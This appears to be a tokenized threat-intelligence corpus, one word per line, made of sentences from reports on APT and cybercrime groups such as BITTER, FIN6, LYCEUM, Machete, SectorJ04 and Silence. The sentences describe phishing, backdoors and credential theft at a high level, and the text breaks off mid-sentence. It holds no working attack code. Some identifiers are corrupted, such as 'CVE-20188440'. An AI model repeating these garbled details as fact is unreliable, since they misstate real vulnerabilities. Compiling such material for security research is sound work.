Utilities
software
for
remote
access
.
 
Interestingly
,
some
of
the
APT41's
POISONPLUG
malware
samples
leverage
the
Steam
Community
website
associated
with
Valve
,
a
video
game
developer
and
publisher
.
 
The
campaign
targeting
accountants
in
the
Balkans
shows
some
similarities
with
a
campaign
aimed
at
Ukrainian
notaries
reported
in
2016
.
 
Based
on
the
Lets
Encrypt
certificate
issuance
date
,
we
believe
this
campaign
to
be
active
from
May
2019
.
 
One
of
the
domains
uncovered
during
the
investigation
was
identified
by
the
Chinese
security
vendor
CERT
360
as
being
part
of
the
BITTER
APT
campaign
in
May
2019
.
 
Further
analysis
of
the
BITTER
APTs
infrastructure
uncovered
a
broader
phishing
campaign
targeting
other
government
sites
and
state-owned
enterprises
in
China
.
 
Further
investigation
revealed
approximately
40
additional
sites
,
all
of
which
appear
to
be
targeting
the
government
of
China
and
other
organisations
in
China
.
 
We
expect
to
see
BITTER
APT
continuing
to
target
the
government
of
China
by
employing
spoofed
login
pages
designed
to
steal
user
credentials
and
obtain
access
to
privileged
account
information
.
 
This
domain
and
IP
address
has
been
previously
associated
with
the
BITTER
APT
and
targeting
government
agencies
in
China
with
phishing
attacks
,
based
on
reporting
from
360-CERT
.
 
At
the
time
of
analysis
,
the
subdomains
did
not
host
a
website;
however
,
based
on
BITTER
APT
groups
targeting
patterns
,
it
is
highly
likely
that
they
were
created
to
host
faux
login
phishing
pages
designed
to
steal
users
credentials
.
 
BITTER
APT
campaigns
are
primarily
targeting
China
,
Pakistan
and
Saudi
Arabia
historically
.
 
As
part
of
its
ongoing
research
initiatives
,
the
Anomali
Threat
Research
Team
has
discovered
a
new
phishing
attack
leveraging
spoof
sites
that
seem
to
be
designed
to
steal
email
credentials
from
the
target
victims
within
the
government
of
the
Peoples
Republic
of
China
.
 
360
Threat
Intelligence
Center
has
reported
on
related
indicators
being
attributed
to
BITTER
APT
a
South
Asian
country
suspected
Indian
APT
in
open
source
reporting
.
 
China
Chopper
is
a
tool
that
has
been
used
by
some
state-sponsored
actors
such
as
Leviathan
and
Threat
Group-3390
,
but
during
our
investigation
we've
seen
actors
with
varying
skill
levels
.
 
China
Chopper
is
a
tool
that
allows
attackers
to
remotely
control
the
target
system
that
needs
to
be
running
a
web
server
application
before
it
can
be
targeted
by
the
tool
.
 
Cisco
Talos
discovered
significant
China
Chopper
activity
over
a
two-year
period
beginning
in
June
2017
,
which
shows
that
even
nine
years
after
its
creation
,
attackers
are
using
China
Chopper
without
significant
modifications
.
 
Here
,
we
investigate
a
campaign
targeting
an
Asian
government
organization
.
 
We
observed
another
campaign
targeting
an
organisation
located
in
Lebanon
.
 
China
Chopper
contains
a
remote
shell
(
Virtual
Terminal
)
function
that
has
a
first
suggested
command
of
netstat
an|find
ESTABLISHED
.
 
They
download
and
install
an
archive
containing
executables
and
trivially
modified
source
code
of
the
password-stealing
tool
Mimikatz
Lite
as
GetPassword.exe
.
 
The
tool
investigates
the
Local
Security
Authority
Subsystem
memory
space
in
order
to
find
,
decrypt
and
display
retrieved
passwords
.
 
The
actor
attempts
to
exploit
CVE-20188440
an
elevation
of
privilege
vulnerability
in
Windows
when
it
improperly
handles
calls
to
Advanced
Local
Procedure
Call
to
elevate
the
privileges
using
a
modified
proof-of-concept
exploit
.
 
The
attacker
obtains
the
required
privileges
and
launches
a
few
other
tools
to
modify
the
access
control
lists
(ACLs)
of
all
websites
running
on
the
affected
server
.
 
The
Windows
branch
of
the
Cloud
Atlas
intrusion
set
still
uses
spear-phishing
emails
to
target
high
profile
victims
.
 
From
the
beginning
of
2019
until
July
,
we
have
been
able
to
identify
different
spear-phishing
campaigns
related
to
this
threat
actor
mostly
focused
on
Russia
,
Central
Asia
and
regions
of
Ukraine
with
ongoing
military
conflicts
.
 
We
described
one
of
the
techniques
used
by
Cloud
Atlas
in
2017
and
our
colleagues
at
Palo
Alto
Networks
also
wrote
about
it
in
November
2018
.
 
The
China
Chopper
actor
activity
starts
with
the
download
and
execution
of
two
exploit
files
which
attempt
to
exploit
the
Windows
vulnerabilities
CVE-2015-0062
,
CVE-2015-1701
and
CVE-2016-0099
to
allow
the
attacker
to
modify
other
objects
on
the
server
.
 
Previously
,
Cloud
Atlas
dropped
its
validator
implant
named
PowerShower
directly
,
after
exploiting
the
Microsoft
Equation
vulnerability
CVE-2017-11882
mixed
with
CVE-2018-0802
.
 
This
malware
has
been
used
since
October
2018
by
Cloud
Atlas
as
a
validator
and
now
as
a
second
stage
.
 
Cloud
Atlas
remains
very
prolific
in
Eastern
Europe
and
Central
Asia
.
 
During
its
recent
campaigns
,
Cloud
Atlas
used
a
new
polymorphic
infection
chain
relying
no
more
on
PowerShower
directly
after
infection
,
but
executing
a
polymorphic
HTA
hosted
on
a
remote
server
,
which
is
used
to
drop
three
different
files
on
the
local
system
.
 
The
Gamaredon
Group
has
been
actively
launching
spear-phishing
attacks
against
Ukrainian
government
and
military
departments
from
the
mid-2013s
.
 
In
addition
,
the
anonymous
cybersecurity
experts
referenced
in
the
article
connected
the
malicious
Gamaredon
Group
actors
with
Russian
state-sponsored
hackers
.
 
In
one
article
published
in
the
Kharkiv
Observer
an
independent
Ukranian
online
publication
an
unnamed
source
stated
that
even
the
Ukrainian
Presidential
Administration
has
been
attacked
by
malware
developed
by
the
Gamaredon
Group
.
 
Gamaredon
Group
primarily
target
Ukrainian
organizations
and
resources
using
spear-phishing
attacks
,
and
they
use
military
or
similar
documents
as
bait
.
 
Once
they
have
found
a
victim
,
they
then
deploy
remote
manipulation
system
binaries
(RMS)
via
self-extracting
archives
and
batch
command
files
.
 
The
following
archive
caught
our
attention
for
exploiting
a
WinRAR
unacev2
module
vulnerability
and
for
having
interesting
content
.
 
During
a
recent
incident
response
investigation
,
our
team
identified
new
attacks
by
the
financially
motivated
attack
group
ITG08
,
also
known
as
FIN6
.
 
More
recently
,
ITG08
has
been
observed
targeting
e-commerce
environments
by
injecting
malicious
code
into
online
checkout
pages
of
compromised
websites
a
technique
known
as
online
skimming
thereby
stealing
payment
card
data
transmitted
to
the
vendor
by
unsuspecting
customers
.
 
This
tool
,
a
TTP
observed
in
ITG08
attacks
since
2018
,
is
sold
on
the
dark
web
by
an
underground
malware-as-a-service
(MaaS)
provider
.
 
ITG08
is
an
organized
cybercrime
gang
that
has
been
active
since
2015
,
mostly
targeting
pointof-sale
(POS)
machines
in
brick-and-mortar
retailers
and
companies
in
the
hospitality
sector
in
the
U.S.
and
Europe
.
 
Past
campaigns
by
ITG08
using
the
More_eggs
backdoor
were
last
reported
in
February
2019
.
 
Attackers
use
it
to
create
,
expand
and
cement
their
foothold
in
compromised
environments
.
 
Lastly
,
ITG08
used
Comodo
code-signing
certificates
several
times
during
the
course
of
the
campaign
.
 
Lets
take
a
closer
look
at
ITG08s
TTPs
that
are
relevant
to
the
campaign
we
investigated
,
starting
with
its
spear
phishing
and
intrusion
tactics
and
covering
information
on
its
use
of
the
More_eggs
backdoor
.
 
Additional
capabilities
of
the
More_eggs
malware
include
the
download
and
execution
of
files
and
scripts
and
running
commands
using
cmd.exe
.
 
X-Force
IRIS
determined
that
the
More_eggs
backdoor
later
downloaded
additional
files
,
including
a
signed
binary
shellcode
loader
and
a
signed
Dynamic
Link
Library
(
DLL
)
,
as
described
below
,
to
create
a
reverse
shell
and
connect
to
a
remote
host
.
 
Once
the
ITG08
established
a
foothold
on
the
network
,
they
employed
WMI
and
PowerShell
techniques
to
perform
network
reconnaissance
and
move
laterally
within
the
environment
.
 
The
attackers
used
this
technique
to
remotely
install
a
Metasploit
reverse
TCP
stager
on
select
systems
,
subsequently
spawning
a
Meterpreter
session
and
Mimikatz
.
 
In
addition
to
the
More_eggs
malware
,
ITG08
leveraged
in-memory
attacks
by
injecting
malicious
code
,
in
this
case
Mimikatz
,
into
legitimate
system
processes
.
 
A
recently
rising
attack
tool
in
ITG08
campaigns
has
been
the
More_eggs
JScript
backdoor
.
 
Mimikatz
is
a
post-exploitation
tool
that
allows
attackers
to
extract
credentials
from
volatile
memory
.
 
After
a
successful
phishing
attack
in
which
users
have
opened
emails
and
browsed
to
malicious
links
,
ITG08
attackers
install
the
More_eggs
JScript
backdoor
on
user
devices
alongside
several
other
malware
components
.
 
Beyond
using
More_eggs
as
a
backdoor
,
ITG08
in
this
campaign
also
used
offensive
security
tools
and
PowerShell
scripts
to
carry
out
the
different
stages
of
the
attack
.
 
After
injecting
Meterpreter
into
memory
,
the
attacker
had
complete
control
of
the
infected
device
.
 
IBM
X-Force
IRIS
has
gained
insight
into
ITG08s
intrusion
methods
,
ability
to
navigate
laterally
,
use
of
custom
and
open-source
tools
,
and
typical
persistence
mechanisms
.
 
After
the
phishing
email
resulted
in
a
successful
infiltration
,
ITG08
used
the
More_eggs
backdoor
to
gain
a
foothold
and
infect
additional
devices
.
 
In
addition
,
configuring
PowerShell
script
logging
and
identifying
any
obfuscation
will
assist
in
mitigating
ITG08s
use
of
PowerShell
to
conduct
malicious
activity
.
 
The
LYCEUM
threat
group
targets
organizations
in
sectors
of
strategic
national
importance
,
including
oil
and
gas
and
possibly
telecommunications
.
 
CTU
research
indicates
that
LYCEUM
may
have
been
active
as
early
as
April
2018
.
 
In
May
2019
,
the
threat
group
launched
a
campaign
against
oil
and
gas
organizations
in
the
Middle
East
.
 
This
campaign
followed
a
sharp
uptick
in
development
and
testing
of
their
toolkit
against
a
public
multivendor
malware
scanning
service
in
February
2019
.
 
Stylistically
,
the
observed
tradecraft
resembles
activity
from
groups
such
as
COBALT
GYPSY
(which
is
related
to
OilRig
,
Crambus
,
and
APT34
and
COBALT
TRINITY
also
known
as
Elfin
and
APT33
.
 
When
CTU
researchers
first
published
information
about
LYCEUM
to
Secureworks
Threat
Intelligence
clients
,
no
public
documentation
on
the
group
existed
.
 
Using
compromised
accounts
,
LYCEUM
send
spearphishing
emails
with
malicious
Excel
attachments
to
deliver
the
DanBot
malware
,
which
subsequently
deploys
post-intrusion
tools
.
 
The
developer
consistently
used
Accept-Enconding
(note
the
extra
n)
in
all
DanBot
samples
analyzed
by
CTU
researchers
.
 
Get-LAPSP.ps1
is
a
PowerShell
script
that
gathers
account
information
from
Active
Directory
via
LDAP
.
 
LYCEUM
deployed
this
tool
via
DanBot
shortly
after
gaining
initial
access
to
a
compromised
environment
.
 
LYCEUM
delivers
weaponized
maldocs
via
spearphishing
from
the
compromised
accounts
to
the
targeted
executives
,
human
resources
(HR)
staff
,
and
IT
personnel
.
 
This
focus
on
training
aligns
with
LYCEUMs
targeting
of
executives
,
HR
staff
,
and
IT
personnel
.
 
Despite
the
initial
perception
that
the
maldoc
sample
was
intended
for
ICS
or
OT
staff
,
LYCEUM
has
not
demonstrated
an
interest
in
those
environments
.
 
However
,
CTU
researchers
cannot
dismiss
the
possibility
that
the
LYCEUM
could
seek
access
to
OT
environments
after
establishing
robust
access
to
the
IT
environment
.
 
LYCEUM
is
an
emerging
threat
to
energy
organizations
in
the
Middle
East
,
but
organizations
should
not
assume
that
future
targeting
will
be
limited
to
this
sector
.
 
Aside
from
deploying
novel
malware
,
LYCEUMs
activity
demonstrates
capabilities
CTU
researchers
have
observed
from
other
threat
groups
and
reinforces
the
value
of
a
few
key
controls
.
 
Password
spraying
,
DNS
tunneling
,
social
engineering
,
and
abuse
of
security
testing
frameworks
are
common
tactics
,
particularly
from
threat
groups
operating
in
the
Middle
East
.
 
The
group
behind
these
attacks
has
stolen
gigabytes
of
confidential
documents
,
mostly
from
military
organizations
.
 
Machete
is
still
very
active
at
the
time
of
this
publication
,
regularly
introducing
changes
to
its
malware
,
infrastructure
and
spearphishing
campaigns
.
 
ESET
has
been
tracking
a
new
version
of
Machete
(the
groups
Python-based
toolset)
that
was
first
seen
in
April
2018
.
 
This
extends
to
other
countries
in
Latin
America
,
with
the
Ecuadorean
military
being
another
organization
highly
targeted
with
the
Machete
malware
.
 
Their
long
run
of
attacks
,
focused
on
Latin
American
countries
,
has
allowed
them
to
collect
intelligence
and
refine
their
tactics
over
the
years
.
 
Machete
is
interested
in
files
that
describe
navigation
routes
and
positioning
using
military
grids
.
 
The
Machete
group
sends
very
specific
emails
directly
to
its
victims
,
and
these
change
from
target
to
target
.
 
The
Machete
group
is
very
active
and
has
introduced
several
changes
to
its
malware
since
a
new
version
was
released
in
April
2018
.
 
Previous
versions
were
described
by
Kaspersky
in
2014
and
Cylance
in
2017
.
 
Since
August
2018
,
the
Machete
components
have
been
delivered
with
an
extra
layer
of
obfuscation
.
 
The
GoogleUpdate.exe
component
is
responsible
for
communicating
with
the
remote
C&C
server
.
 
ESET
has
been
tracking
this
threat
for
months
and
has
observed
several
changes
,
sometimes
within
weeks
.
 
This
ACT
,
the
malware
can
have
its
configuration
,
malicious
binaries
and
file
listings
updated
,
but
can
also
download
and
execute
other
binaries
.
 
The
presence
of
code
to
exfiltrate
data
to
removable
drives
when
there
is
physical
access
to
a
compromised
computer
may
indicate
that
Machete
operators
could
have
a
presence
in
one
of
the
targeted
countries
,
although
we
cannot
be
certain
.
 
This
group
is
very
active
and
continues
to
develop
new
features
for
its
malware
,
and
implement
infrastructure
changes
in
2019
.
 
Machete's
long
run
of
attacks
,
focused
in
Latin
American
countries
,
has
allowed
them
to
collect
intelligence
and
refine
their
tactics
over
the
years
.
 
ESET
researchers
have
detected
an
ongoing
,
highly
targeted
campaign
,
with
a
majority
of
the
targets
being
military
organizations
.
 
The
group
behind
Machete
uses
effective
spearphishing
techniques
.
 
First
described
by
Kaspersky
in
2014
[1]
and
later
,
by
Cylance
in
2017
[2]
,
Machete
is
a
piece
of
malware
found
to
be
targeting
high
profile
individuals
and
organizations
in
Latin
American
countries
.
 
In
2018
Machete
reappeared
with
new
code
and
new
features
.
 
As
of
June
2019
,
ESET
has
seen
over
50
victims
being
actively
spied
upon
by
Machete
,
with
more
than
half
of
them
being
computers
belonging
to
the
Venezuelan
military
forces
.
 
Machete
has
Latin
American
targets
and
has
been
developed
by
a
Spanish-speaking
group
,
presumably
from
a
LATAM
country
.
 
Machete
was
active
and
constantly
working
on
very
effective
spearphishing
campaigns
.
 
In
some
cases
,
Machete
trick
new
victims
by
sending
real
documents
that
had
been
stolen
on
the
very
same
day
.
 
Machete
relies
on
spearphishing
to
compromise
its
targets
.
 
They
seem
to
have
specialized
knowledge
about
military
operations
,
as
they
are
focused
on
stealing
specific
files
such
as
those
that
describe
navigation
routes
.
 
Attackers
take
advantage
of
that
,
along
with
their
knowledge
of
military
jargon
and
etiquette
,
to
craft
very
convincing
phishing
emails
.
 
Operators
behind
Machete
apparently
already
have
information
about
individuals
or
organizations
of
interest
to
them
in
Latin
America
,
how
to
reach
them
,
and
how
best
to
trick
them
into
getting
compromised
.
 
Since
the
end
of
March
up
until
the
end
of
May
2019
,
ESET
observed
that
there
were
more
than
50
victimized
computers
actively
communicating
with
the
C&C
server
.
 
This
extends
to
other
countries
in
Latin
America
,
with
the
Ecuadorean
military
being
another
organization
highly
targeted
by
Machete
.
 
Machete
is
malware
that
has
been
developed
and
is
actively
maintained
by
a
Spanish-speaking
group
.
 
Since
it
was
active
in
2012
,
it
has
been
carrying
out
attacks
against
sensitive
targets
in
China
and
is
one
of
the
most
active
APT
attack
organizations
targeting
mainland
China
in
recent
years
.
 
By
introducing
small
changes
to
their
code
and
infrastructure
,
the
group
has
bypassed
several
security
products
.
 
OceanLotus
will
release
malicious
sub-packages
in
the
background
,
receive
the
remote
control
command
,
steal
the
privacy
information
of
users
such
as
SMS
messages
,
contacts
,
call
records
,
geographic
locations
,
and
browser
records
.
 
They
also
download
apks
secretly
and
record
audios
and
videos
,
then
upload
users
privacy
information
to
server
,
causing
users
privacy
leakage
.
 
It
can
be
seen
that
after
the
code
leakage
,
the
CEO
of
the
HackingTeam
organization
said
that
the
leaked
code
is
only
a
small
part
is
based
on
the
facts
,
which
also
reflects
that
the
network
arms
merchants
have
lowered
the
threshold
of
APT
attacks
to
a
certain
extent
,
making
more
uncertainties
of
cyber
attacks
.
 
This
report
includes
details
related
to
the
major
hacking
targets
of
the
SectorJ04
group
in
2019
,
how
those
targets
were
hacked
,
characteristics
of
their
hacking
activities
this
year
and
recent
cases
of
the
SectorJ04
groups
hacking
.
 
In
2019
,
the
SectorJ04
group
expanded
its
hacking
activities
to
cover
various
industrial
sectors
located
across
Southeast
Asia
and
East
Asia
,
and
is
changing
the
pattern
of
their
attacks
from
targeted
attacks
to
searching
for
random
victims
.
 
The
SectorJ04
group
has
maintained
the
scope
of
its
existing
hacking
activities
while
expanding
its
hacking
activities
to
companies
in
various
industrial
sectors
located
in
East
Asia
and
Southeast
Asia
.
 
There
was
a
significant
increase
in
SectorJ04's
hacking
activities
in
2019
,
especially
those
targeting
South
Korea
.
 
They
mainly
utilize
spam
email
to
deliver
their
backdoor
to
the
infected
system
that
can
perform
additional
commands
from
the
attackers
server
.
 
We
saw
SectorJ04
group
activity
in
Germany
,
Indonesia
,
the
United
States
,
Taiwan
,
India
.
 
The
SectorJ04
group
mainly
utilizes
a
spear
phishing
email
with
MS
Word
or
Excel
files
attached
,
and
the
document
files
downloads
the
Microsoft
Installer
(MSI)
installation
file
from
the
attacker
server
and
uses
it
to
install
backdoor
on
the
infected
system
.
 
The
SectorJ04
groups
preexisting
targets
were
financial
institutions
located
in
countries
such
as
North
America
and
Europe
,
or
general
companies
such
as
retail
and
manufacturing
,
but
they
recently
expanded
their
LOCs
of
activity
to
include
the
medical
,
pharmaceutical
,
media
,
energy
and
manufacturing
industries
.
 
The
SectorJ04
group
mainly
used
their
own
backdoor
,
ServHelper
and
FlawedAmmy
RAT
,
for
hacking
.
 
Backdoors
are
installed
in
infected
systems
and
SectorJ04
also
distributed
email
stealers
,
botnet
malware
and
ransomware
through
those
backdoors
.
 
Backdoor
installed
in
the
infected
system
distributed
additional
botnet
malware
,
ransomware
and
email
stealers
.
 
SectorJ04
was
recently
confirmed
to
use
additional
backdoor
called
AdroMut
and
FlowerPippi
,
which
is
used
to
install
other
backdoor
such
as
FlawedAmmy
RAT
on
behalf
of
the
MSI
file
,
or
to
collect
system
information
and
send
it
to
the
attackers
server
.
 
Although
the
SectorJ04
group
mainly
targeted
countries
located
in
Europe
or
North
America
,
it
has
recently
expanded
its
field
of
activities
to
countries
located
in
Southeast
Asia
and
East
Asia
.
 
The
email
stealer
collects
connection
protocol
information
and
account
information
,
such
as
SMTP
,
IMAP
,
and
POP3
,
which
are
stored
in
the
registry
by
Outlook
and
Thunderbird
mail
clients
and
sends
them
to
the
attacker
server
in
a
specific
format
.
 
A
new
type
of
backdoor
called
AdroMut
and
a
new
malware
called
FlowerPippi
was
also
found
coming
from
SectorJ04
.
 
But
after
2019
SectorJ04
has
changed
its
hacking
strategy
to
attack
using
spam
email
.
 
The
hacking
activities
of
SectorJ04
group
,
which
targeted
South
Korea
in
the
first
half
of
2019
,
have
been
continuously
discovered
.
 
Prior
to
2019
,
the
SectorJ04
group
conducted
large-scale
hacking
activities
for
financial
gain
using
exploit
kits
on
websites
to
install
ransomware
,
such
as
Locky
and
GlobeImporter
,
along
with
its
banking
Trojan
,
on
its
victims
computers
.
 
In
June
2019
,
continuous
SectorJ04's
activities
targeting
South
Korea
were
found
again
and
spam
emails
were
written
with
various
contents
,
including
transaction
statements
,
receipts
and
remittance
cards
.
 
The
SectorJ04
group
has
carried
out
large-scale
hacking
activities
targeting
South
Korea
,
while
also
expanding
the
field
of
attacks
to
Southeast
Asian
countries
such
as
Taiwan
and
the
Philippines
.
 
In
June
,
SectorJ04
group
conducted
hacking
using
spam
emails
written
in
various
languages
,
including
English
,
Arabic
,
Korean
and
Italian
,
and
the
emails
were
written
with
various
contents
,
including
remittance
card
,
invoice
and
tax
invoice
.
 
Spam
emails
and
attachments
written
in
Chinese
were
found
in
May
,
and
the
SectorJ04
group
at
that
time
targeted
industrial
sectors
such
as
electronics
and
telecommunications
,
international
schools
and
manufacturing
.
 
In
addition
to
their
preexist
backdoor
,
ServHelper
and
FlawedAmmy
,
they
have
also
been
confirmed
to
use
the
backdoor
called
AdroMut
and
FlowerPippi
.
 
AdroMut
downloads
the
malware
ServHelper
and
FlawedAmmy
RAT
used
by
the
SectorJ04
group
from
the
attacker
server
and
simultaneously
performs
the
functions
of
a
backdoor
.
 
The
SectorJ04
group
,
which
has
been
utilizing
the
same
pattern
of
infection
and
the
same
malware
for
more
than
six
months
,
is
believed
to
be
attempting
to
change
its
infection
methods
such
as
downloading
malware
directly
from
malicious
documents
without
using
MSI
installation
files
,
changing
their
spam
email
format
and
using
new
types
of
backdoor
.
 
Until
2019
,
SectorJ04
group
had
carried
out
massive
website-based
hacking
activities
that
mainly
utilize
ransomware
and
banking
trojans
for
financial
profit
,
and
has
also
been
carrying
out
information
gathering
activities
to
secure
attack
resources
such
as
email
accounts
and
system
login
information
from
users
since
2019
.
 
The
SectorJ04
group
has
shown
a
pattern
of
hacking
activities
that
have
changed
from
targeted
attacks
to
a
large-scale
distribution
of
spam
.
 
This
allows
them
to
expand
their
range
of
targets
of
hacking
activities
for
financial
profit
,
and
in
this
regard
,
SectorJ04
group
has
been
found
to
have
hacked
into
a
companys
internal
network
by
using
a
spear
phishing
email
targeting
executives
and
employees
of
certain
South
Korean
companies
around
February
2019
.
 
SectorJ04
group
carried
out
intensive
hacking
on
various
industrial
sectors
,
including
South
Koreas
media
,
manufacturing
and
universities
,
around
February
and
March
2019
.
 
SectorJ04
used
the
spear
phishing
email
to
spread
malicious
Excel
or
malicious
Word
files
,
and
downloaded
the
MSI
files
from
the
attackers
server
when
the
malicious
documents
were
run
.
 
SectorJ04
group
conducted
hacking
activities
targeting
financial
institutions
located
in
India
and
Hong
Kong
around
April
2019
.
 
SectorJ04
group
carried
out
hacking
activities
targeting
financial
institutions
located
in
Italy
and
other
countries
around
May
2019
.
 
In
late
July
,
SectorJ04
group
used
FlawedAmmy
RAT
to
carry
out
hacking
attacks
on
companies
and
universities
in
sectors
such
as
education
,
job
openings
,
real
estate
and
semiconductors
in
South
Korea
.
 
In
early
August
,
the
SectorJ04
group
carried
out
extensive
hacking
activities
targeting
the
users
around
the
world
,
including
South
Korea
,
India
,
Britain
,
the
United
States
,
Germany
,
Canada
,
Argentina
,
Bangladesh
and
Hong
Kong
.
 
Spam
emails
targeting
email
accounts
used
in
the
integrated
mail
service
of
public
officials
were
also
found
in
the
hacking
activity
.
 
They
are
one
of
the
most
active
cyber
crime
groups
in
2019
,
and
they
often
modify
and
tweak
their
hacking
methods
and
perform
periodic
hacking
activities
.
 
Now
,
Silence
is
one
of
the
most
active
threat
actors
targeting
the
financial
sector
.
 
Since
we
released
our
original
report
,
Silence:
Moving
into
the
darkside
,
the
confirmed
damage
from
Silence's
operations
has
increased
fivefold
compared
to
the
figures
in
Group-IB's
initial
report
.
 
Silence
started
by
targeting
organizations
in
Russia
,
gradually
shifting
their
focus
to
former
Soviet
countries
,
and
then
the
world
.
 
Silence
also
started
using
Ivoke
,
a
fileless
loader
,
and
EDA
agent
,
both
written
in
PowerShell
.
 
Silence
2.0:
Going
Global
is
an
extension
of
our
original
report:
Silence:
Moving
into
the
Darkside
which
remains
the
most
significant
contribution
to
the
research
on
the
group
and
is
the
first
such
report
to
reveal
Silences
activity
.
 
Since
the
reports
release
in
September
2018
,
Group-IBs
Threat
Intelligence
team
has
detected
16
campaigns
targeting
banks
launched
by
Silence
.
 
Like
the
majority
of
APT
groups
,
Silence
uses
phishing
as
their
infection
vector
.
 
In
the
last
successful
attack
described
in
Silence:
Moving
into
the
darkside
,
dated
April
2018
,
the
hackers
siphoned
off
about
$150
,
000
through
ATMs
in
a
single
night
.
 
Prior
to
April
2018
,
as
described
in
Group-IBs
Silence:
Moving
into
the
darkside
report
,
Silences
target
interests
were
primarily
limited
to
former
Soviet
and
Eastern
European
countries
including
Russia
,
Ukraine
,
Belarus
,
Azerbaijan
,
Poland
,
and
Kazakhstan
.
 
In
2018
,
Silence
conducted
test
campaigns
to
update
their
database
of
current
targets
and
expand
their
attack
geography
.
 
The
threat
actors
emails
usually
contain
a
picture
or
a
link
without
a
malicious
payload
and
are
sent
out
to
a
huge
recipient
database
of
up
to
85
,
000
users
.
 
Silence
has
conducted
at
least
three
campaigns
using
recon
emails
,
followed
by
malicious
mail
sent
to
an
updated
recipient
list
.
 
Group-IB
has
also
detected
recon
emails
sent
out
to
New
Zealand
.
 
Since
our
last
public
report
,
Silence
has
sent
out
more
than
170
,
000
recon
emails
to
banks
in
Russia
,
the
former
Soviet
Union
,
Asia
and
Europe
.
 
In
November
2018
,
Silence
tried
their
hand
at
targeting
the
Asian
market
for
the
first
time
in
their
history
.
 
In
total
,
Silence
sent
out
about
80
,
000
emails
,
with
more
than
half
of
them
targeting
Taiwan
,
Malaysia
,
and
South
Korea
.
 
Prior
to
April
2018
,
as
described
in
Group-IBs
Silence:
Moving
into
the
darkside
report
,
Silences
target
interests
were
primarily
limited
to
former
Soviet
and
Eastern
European
countries
including
Russia
,
Ukraine
,
Belarus
,
Azerbaijan
,
Poland
,
and
Kazakhstan
.
 
From
16
October
2018
to
1
January
2019
,
Silence
sent
out
about
84
,
000
emails
in
Russia
alone
to
update
their
address
database
.
 
As
part
of
their
phishing
campaigns
,
silence
still
uses
Microsoft
Office
documents
with
macros
or
exploits
,
CHM
files
,
and
.lNK
shortcuts
as
malicious
attachments
.
 
In
the
former
Soviet
Union
,
Silence
targeted
banks
in
Kyrgyzstan
,
Kazakhstan
,
and
Ukraine
.
 
In
2019
,
Group-IB
also
observed
the
use
of
a
new
fileless
PowerShell
loader
called
Ivoke
.
 
The
Silence.Main
Trojan
,
which
is
the
main
stage
of
the
attack
,
has
a
full
set
of
commands
to
control
a
compromised
computer
.
 
As
the
CnC
server
,
Silence
use
CnC-3
server
running
Windows
,
from
which
they
send
commands
to
download
additional
modules
.
 
To
control
ATMs
,
the
group
uses
the
Atmosphere
Trojan
,
which
is
unique
to
Silence
,
or
a
program
called
xfs-disp.exe
.
 
In
addition
,
Silence
downloads
the
reverse
proxy
programs
Silence.ProxyBot
and
SilenceProxyBot.NET
,
which
are
described
in
detail
in
the
report
Silence:
moving
into
the
darkside
.
 
Analysis
of
the
emails
has
shown
that
the
attachment
contains
an
exploit
for
the
CVE-2017-11882
vulnerability
.
 
Group-IB
specialists
tracked
a
massive
mailout
of
emails
containing
a
malicious
Microsoft
Word
attachment
titled
.doc
[Contract.doc]
.
 
Silence
sent
out
emails
to
Russian
banks
.
 
The
exploit
installs
Silences
loader
,
designed
to
download
backdoors
and
other
malicious
programs
.
 
Silence
conducted
a
massive
phishing
campaign
posing
as
the
Central
Bank
of
the
Russian
Federation
.
 
Group-IB
specialists
have
established
that
the
aim
of
the
attack
was
to
deliver
and
launch
the
second
stage
of
Silences
Trojan
,
known
as
Silence.MainModule
.
 
Silence
attacked
financial
organisations
in
the
UK
.
 
Silence
conducted
the
first
stage
of
their
Asian
campaign
,
organising
a
massive
phishing
attack
aimed
at
receiving
an
up-to-date
list
of
current
recipients
in
different
countries
for
further
targeted
attacks
delivering
their
malicious
software
.
 
The
attackers
used
the
server
deployed
on
6
June
2019
to
control
compromised
workstations
in
these
banks
.
 
On
24
March
2019
,
Silence.ProxyBot
(
MD5
2fe01a04d6beef14555b2cf9a717615c
)
was
uploaded
to
VirusTotal
from
an
IP
address
in
Sri
Lanka
.
 
On
October
18th
,
2018
,
the
group
sent
out
emails
to
British
financial
companies
as
part
of
their
preparatory
campaign
.
 
Group-IB
experts
established
that
the
server
185.20.187.89
started
functioning
no
later
than
28
January
2019
.
 
According
to
local
media
reports
,
in
2019
Silence
successfully
withdrew
money
from
the
Bangladeshi
bank
twice
within
2
months
.
 
To
do
this
,
the
actor
may
have
used
a
unique
tool
called
Atmosphere
,
a
Trojan
developed
by
Silence
to
remotely
control
ATM
dispensers
,
or
a
similar
program
called
xfs-disp.exe
,
which
the
actor
may
have
used
in
their
attack
on
IT
Bank
.
 
As
we
described
in
Silence:
Moving
into
the
darkside
report
,
Silence
has
experience
with
theft
using
compromised
card
processing
systems
.
 
In
February
2019
,
Russian
media7
reported
a
Silence
attack
on
IT
Bank
in
the
city
of
Omsk
.
 
On
16
January
2019
,
Silence
sent
out
phishing
emails
with
malicious
attachments
disguised
as
invitations
to
the
International
Financial
Forum
iFin-2019
.
 
Group-IB
specialists
determined
that
the
email
addresses
of
IT
bank
employees
were
among
the
recipients
of
these
emails
.
 
The
main
goal
of
Silence.Downloader
is
to
receive
an
executable
file
and
run
it
on
an
infected
machine
.
 
Silence.MainModule
is
a
typical
remote
control
Trojan
that
provides
access
to
the
command
shell
CMD.exe
with
the
possibility
of
downloading
files
from
remote
nodes
to
a
computer
and
uploading
files
from
a
computer
to
a
remote
server
.
 
Since
at
least
2011
,
these
hackers
have
been
using
malware
to
spy
on
corporate
networks
.
 
Hackers
are
targeting
high-tech
companies
as
well
as
chemical
and
pharmaceutical
companies
.
 
The
hackers
will
map
a
companys
network
and
look
for
strategically
favorable
locations
for
placing
their
malware
.
 
The
corporation
conrms
the
Winnti
incident
and
issues
the
following
statement:
The
cyberattack
was
discovered
in
the
summer
of
2014
and
Henkel
promptly
took
all
necessary
precautions.
Henkel
claims
that
a
very
small
portion
of
its
worldwide
IT
systems
had
been
aected
the
systems
in
Germany
.
 
A
BASF
spokeswoman
tells
us
in
an
email
that
in
July
2015
,
hackers
had
successfully
overcome
the
rst
levels
of
defense
.
 
The
tool
was
written
by
sta
of
Thyssenkrupp
,
because
the
industrial
giantcompany
number
elevenhad
been
spied
on
by
Winnti
.
 
Hackers
are
charged
with
spying
on
a
manufacturer
of
gas
turbines
.
 
The
Hong
Kong
government
was
spied
on
by
the
Winnti
hackers
.
 
Komplex
is
a
backdoor
that
has
been
used
by
APT28
on
OS
X
and
appears
to
be
developed
in
a
similar
manner
to
